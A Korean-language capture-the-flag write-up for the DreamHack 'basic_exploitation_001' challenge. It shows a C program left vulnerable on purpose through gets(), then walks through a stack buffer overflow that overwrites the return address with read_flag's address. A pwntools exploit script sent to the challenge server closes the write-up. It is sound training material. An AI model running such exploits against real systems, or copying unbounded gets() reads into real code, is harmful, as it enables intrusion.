# basic_exploitation_001

### Problem
    #include <stdio.h>
    #include <stdlib.h>
    #include <signal.h>
    #include <unistd.h>
    
    void alarm_handler() {
        puts("TIME OUT");
        exit(-1);
    }
    
    void initialize() {
        setvbuf(stdin, NULL, _IONBF, 0);
        setvbuf(stdout, NULL, _IONBF, 0);
    
        signal(SIGALRM, alarm_handler);
        alarm(30);
    }
    
    void read_flag() {
        system("cat /flag");
    }
    
    int main(int argc, char *argv[]) {
    
        char buf[0x80];
    
        initialize();
    
        gets(buf);
    
        return 0;
    }

### Solution
1. main 함수를 보면 buf란 문자 배열이 선언되어 있고 크기는 0x80 = 128이다.

2. 그리고 initialize함수가 호출된다. 해당 함수는 basic_exploitation_000에서 언급했으므로 간단하게 넘어가면 30초의 제한시간을 두는 함수이다.

3. 그리고 gets함수로 buf에 문자열을 입력받는다.

4. 그리고 initialize와 상관없는 함수 read_flag함수가 있다.

5. 함수의 역할은 말 그대로 flag를 출력해주는 함수이다. 그렇다면 우리가 해야할 일은 저 read_flag함수를 호출하게 하면 이번 문제를 해결할 수 있다.

6. basic_explotiation_000과 마찬가지로 버퍼오버플로우를 통해서 return이 될 때 참조하는 ret메모리의 값을 저 read_flag 함수의 주소값으로 변경해주면 main이 종료될 때 read_flag함수가 호출될 것이다.

7. 그림으로 보면 이렇게 구선된다.

![image](https://user-images.githubusercontent.com/53170968/111756199-47484280-88dd-11eb-842a-24146d529efe.png)

8. 그렇다면 알아야 할 것은 read_flag함수의 주소값과 ret메모리까지 필요한 버퍼의 크기이다.

9. 먼저 buf에 입력된 문자열의 크기는 buf의 크기인 0x80=128Byte, sfp의 크기인 4Byte를 합친 132Byte의 문자열과 read_flag함수의 메모리 주소값이다.

10. 그렇다면 read_flag함수의 메모리 주소를 알아보자.

11. basic_exploitation_000은 내가 직접 컴파일했지만 이번에는 read_flag의 정확한 메모리를 알아야하므로 사이트에서 준 바이너리 파일을 실행해보도록 하겠다.

![image](https://user-images.githubusercontent.com/53170968/111756636-cb022f00-88dd-11eb-9521-2387315c5efb.png)

12. 먼저 바이너리파일을 실행할 수 있도록 권한변경을 실시한다.

![image](https://user-images.githubusercontent.com/53170968/111756741-e66d3a00-88dd-11eb-9521-de6070f12dba.png)


13. 그리고 바이너리파일을 gdb를 이용해서 실행하고 read_flag의 주소값을 확인하자.

![image](https://user-images.githubusercontent.com/53170968/111756928-1d435000-88de-11eb-9a3e-f528dba7f5a3.png)

14. 그리고 'A' 132개와 read_flag의 주소값을 입력값으로 해당 파일을 실행했는데 세그멘테이션 오류가 떴다.

15. 이건 내 리눅스문제인지 잘 모르겠다. 일단 의심이 드는 건 내 리눅스 운영체제가 32bit가 아닌 64bit라서 발생하는 오류일 수도 있겠다는 의심이든다.

16. 그리고 read_flag의 주소는 역순으로 입력해주어야한다. 그 이유는 cpu가 주소값을 읽을 때 리틀엔디안방식으로 읽기때문에 역순으로 입력되야 우리가 원하는 주소값으로 입력된다.

17. 일단 내 리눅스 문제인 것 같으니 DreamHack사이트의 원격 문제풀이로 가보자.

![image](https://user-images.githubusercontent.com/53170968/111757373-9b9ff200-88de-11eb-8c39-fe5076e3b194.png)

18. 접속정보를 획득하고 pwntools를 이용해서 접속해보자.


    from pwn import *
    
    p = remote("host1.dreamhack.games", 17920)

    payload = 'A' * 132
    payload += p32(0x80485b9)
    
    p.sendline(payload)
    
    p.interactive()

19. 만든 소스코드를 실행해보자.

![image](https://user-images.githubusercontent.com/53170968/111757709-f6394e00-88de-11eb-99ff-ce7192d893fc.png)

20. 정상적으로 실행되고 Flag를 획득했다.

![image](https://user-images.githubusercontent.com/53170968/111757801-11a45900-88df-11eb-924d-174c84b3277d.png)

![image](https://user-images.githubusercontent.com/53170968/111757819-179a3a00-88df-11eb-94cc-21deec396c4c.png)

21. 획득한 Flag를 입력해서 정답처리되었다.